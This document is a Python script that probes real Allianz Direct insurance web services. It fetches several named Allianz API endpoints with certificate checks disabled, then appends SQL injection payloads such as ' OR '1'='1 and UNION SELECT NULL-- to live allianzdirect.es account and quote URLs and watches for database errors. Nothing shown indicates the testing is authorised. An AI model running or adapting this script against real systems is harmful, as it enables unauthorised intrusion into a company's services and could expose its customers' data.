#!/usr/bin/env python3
import requests
import json
import sys

# APIs encontradas
apis = [
    "https://pro-edp.apis.allianz.com/",
    "https://pro-edp.apis.allianz.com/prod/set-up-service/product-info/",
    "https://api.allianzdirect.com/frontend-logging",
    "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/countries/EU",
    "https://roadsideassistance.allianzdirect.es/",
    "https://assets.prod.azdev.direct/contact-center-webchat"
]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'mapped-lang': 'es-ES',
    'backend-tenant': 'ES'
}

print("=== Testing Allianz Direct APIs ===\n")

for api in apis:
    try:
        print(f"Testing: {api}")
        response = requests.get(api, headers=headers, timeout=5, verify=False)
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            print("Response preview:")
            if 'json' in response.headers.get('content-type', ''):
                data = response.json()
                print(json.dumps(data, indent=2)[:500])
            else:
                print(response.text[:500])
        elif response.status_code == 401:
            print("Authentication required")
        elif response.status_code == 403:
            print("Forbidden - Access denied")
        else:
            print(f"Response: {response.text[:200]}")
        print("-" * 50)
    except Exception as e:
        print(f"Error: {str(e)}")
        print("-" * 50)

# Test for SQL injection points
print("\n=== Testing for potential SQL injection points ===\n")
sql_payloads = [
    "' OR '1'='1",
    "1' AND '1'='1",
    "1 UNION SELECT NULL--",
    "admin'--"
]

test_urls = [
    "https://www.allianzdirect.es/account/?v=",
    "https://www.allianzdirect.es/seguro-de-coche/calcular-precio/?id="
]

for url in test_urls:
    for payload in sql_payloads:
        try:
            test_url = url + payload
            print(f"Testing: {test_url[:50]}...")
            response = requests.get(test_url, headers=headers, timeout=5)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                print(f"Potential SQL error found with payload: {payload}")
            else:
                print(f"Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {str(e)[:50]}")
    print("-" * 50)